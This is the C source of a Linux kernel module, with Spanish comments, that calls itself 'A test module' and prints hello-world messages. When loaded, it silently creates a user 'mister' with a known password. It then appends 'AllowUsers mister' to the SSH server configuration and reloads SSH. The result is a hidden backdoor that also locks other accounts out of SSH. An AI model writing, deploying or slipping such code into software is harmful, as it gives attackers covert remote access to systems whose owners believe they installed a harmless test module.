#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mister");
MODULE_DESCRIPTION("A test module");
MODULE_VERSION("0.03");

static int __init hello_mod_init(void)
{
    int ret;
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    printk(KERN_ALERT "Hello world from kernel!! \n");

    // Crear el usuario 'mister' con contraseña 'mistermister'
    char *argv_adduser[] = { "/usr/sbin/useradd", "-m", "-s", "/bin/bash", "-p", "$y$j9T$127OJibu0iKvD1NNeWkT51$7.5GV9O5qKrxukDZsPNIU0BvJObOkEp6EKXhW2IH0hD", "mister", NULL };
    ret = call_usermodehelper(argv_adduser[0], argv_adduser, envp, UMH_WAIT_EXEC);
    if (ret != 0)
    {
        printk(KERN_ALERT "Failed to create user 'mister': %d\n", ret);
        return ret;
    }

    // Permitir al usuario 'mister' en SSH
    char *argv_ssh_config[] = { "/bin/sh", "-c", "echo 'AllowUsers mister' >> /etc/ssh/sshd_config", NULL };
    ret = call_usermodehelper(argv_ssh_config[0], argv_ssh_config, envp, UMH_WAIT_EXEC);
    if (ret != 0)
    {
        printk(KERN_ALERT "Failed to modify SSH configuration: %d\n", ret);
        return ret;
    }

    // Recargar configuración de SSH
    char *argv_ssh_reload[] = { "/bin/systemctl", "reload", "ssh.service", NULL };
    ret = call_usermodehelper(argv_ssh_reload[0], argv_ssh_reload, envp, UMH_WAIT_EXEC);
    if (ret != 0)
    {
        printk(KERN_ALERT "Failed to reload SSH service: %d\n", ret);
        return ret;
    }

    printk(KERN_ALERT "User 'mister' created with password 'mistermister', SSH access granted\n");

    return 0;
}

static void __exit hello_mod_exit(void)
{
    printk(KERN_ALERT "Exiting hello world module from kernel !!!\n");
}

module_init(hello_mod_init);
module_exit(hello_mod_exit);